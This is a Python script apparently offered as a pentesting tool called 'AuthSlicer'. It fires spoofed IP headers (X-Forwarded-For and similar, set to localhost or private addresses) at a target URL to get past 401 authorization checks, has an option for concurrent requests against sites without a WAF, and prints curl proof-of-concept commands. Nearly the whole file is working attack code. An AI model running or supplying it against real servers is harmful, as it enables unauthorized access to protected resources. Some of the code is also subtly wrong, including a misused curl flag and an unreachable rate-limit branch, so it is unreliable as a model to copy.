import requests
import asyncio
import argparse
from colorama import Fore
import aiohttp
import asyncio

print(Fore.RED,"")
parser = argparse.ArgumentParser(
                    prog='AuthSlicer',
                    description='AuthSlicer is a fast tool that identify server side misconfiguration related to authorization permission in header',
                    usage='python3 authslicer.py -u TARGET \nNo WAF? use multi thread with: python3 authslicer.py -u TARGET --nw' )

parser.add_argument('-u', '--url')      

parser.add_argument('-n', '--nw',
                    action='store_true',
                    help='Disabile WAF-preventions')



args = parser.parse_args()

print(Fore.LIGHTYELLOW_EX,
r'''
      
                       /$$     /$$                 /$$ /$$                                    
                      | $$    | $$                | $$|__/                                    
  /$$$$$$  /$$   /$$ /$$$$$$  | $$$$$$$   /$$$$$$$| $$ /$$  /$$$$$$$  /$$$$$$   /$$$$$$       
 |____  $$| $$  | $$|_  $$_/  | $$__  $$ /$$_____/| $$| $$ /$$_____/ /$$__  $$ /$$__  $$      
  /$$$$$$$| $$  | $$  | $$    | $$  \ $$|  $$$$$$ | $$| $$| $$      | $$$$$$$$| $$  \__/      
 /$$__  $$| $$  | $$  | $$ /$$| $$  | $$ \____  $$| $$| $$| $$      | $$_____/| $$            
|  $$$$$$$|  $$$$$$/  |  $$$$/| $$  | $$ /$$$$$$$/| $$| $$|  $$$$$$$|  $$$$$$$| $$            
 \_______/ \______/    \___/  |__/  |__/|_______/ |__/|__/ \_______/ \_______/|__/            
                                                                                              
                                                                    A tool by INNOCENTx0                                                                                    
'''
)

payloads_l = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forward-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},

    {"X-Forwarded-For": "localhost"},
    {"X-Forward-For": "localhost"},
    {"X-Remote-IP": "localhost"},
    {"X-Originating-IP": "localhost"},
    {"X-Remote-Addr": "localhost"},
    {"X-Client-IP": "localhost"},

    {"X-Forwarded-For": "192.168.0.1"},
    {"X-Forward-For": "192.168.0.1"},
    {"X-Remote-IP": "192.168.0.1"},
    {"X-Originating-IP": "192.168.0.1"},
    {"X-Remote-Addr": "192.168.0.1"},
    {"X-Client-IP": "192.168.0.1"},

    {"X-Forwarded-For": "::1"},
    {"X-Forward-For": "::1"},
    {"X-Remote-IP": "::1"},
    {"X-Originating-IP": "::1"},
    {"X-Remote-Addr": "::1"},
    {"X-Client-IP": "::1"}
]

def header_bypass(user_input):
    target=(user_input)
    for key_payload in payloads_l:
        header_request = requests.get(url=target,headers=key_payload)
        sc = (header_request.status_code)
        clear_sc=(user_input.replace("https://",""))
        if header_request.status_code != 401:
            print(Fore.GREEN,f"[{sc}] {clear_sc} bypassed with payload: {key_payload}")
            print(Fore.YELLOW, "Here is your Proof of Concept:")
            clean_payload = str(key_payload).replace('{', '').replace('}', '').replace("'", '"')

            print(Fore.LIGHTYELLOW_EX,f"    [POC] curl -x GET {user_input} --header {clean_payload}")
        else:
            print(Fore.RED,"[!] Target seems not vulnerable")
            pass


def fuzz_header(user_input):
    clear=(user_input.replace("https://",""))
    print(Fore.GREEN,f"Attacking {clear}")
    response = requests.get(user_input)
    if response.status_code != 404:
        print(Fore.RED,"[200]",Fore.GREEN,("Target is alive, proceeding.."))
        header_bypass(args.url)
    elif response.status_code == 429:
        print(Fore.RED,"[429] Too many requests!")
    else:
        print( Fore.RED,"Target is not alive, check your url")
        print(Fore.RED,f"{response.status_code}")


async def header_bypass_async(user_input):
    target = user_input

    async with aiohttp.ClientSession() as session:

        tasks = []

        for key_payload in payloads_l:
            tasks.append(send_header(session, target, key_payload))

        await asyncio.gather(*tasks)


async def send_header(session, target, key_payload):
    try:
        async with session.get(target, headers=key_payload) as resp:
            sc = resp.status
            clear_sc = target.replace("https://", "")

            if sc != 401:
                print(Fore.GREEN, f"[{sc}] {clear_sc} bypassed with payload: {key_payload}")
                clean_payload = str(key_payload).replace('{', '').replace('}', '').replace("'", '"')
                print(Fore.LIGHTYELLOW_EX, f"    [POC] curl -x GET {target} --header {clean_payload}")
            elif sc == 429:
                print(Fore.RED,"[429] Too many requests!")
            else:
                print(Fore.RED, "[!] Not bypassed", key_payload)

    except Exception as e:
        print(Fore.RED, f"[!] Error: {e}")





if __name__ == '__main__':
    try:
        if args.nw:
            asyncio.run(header_bypass_async(args.url))
        else:
            fuzz_header(args.url)   
    except Exception as e:
        print(Fore.RED,f"[!] Error:{e}")



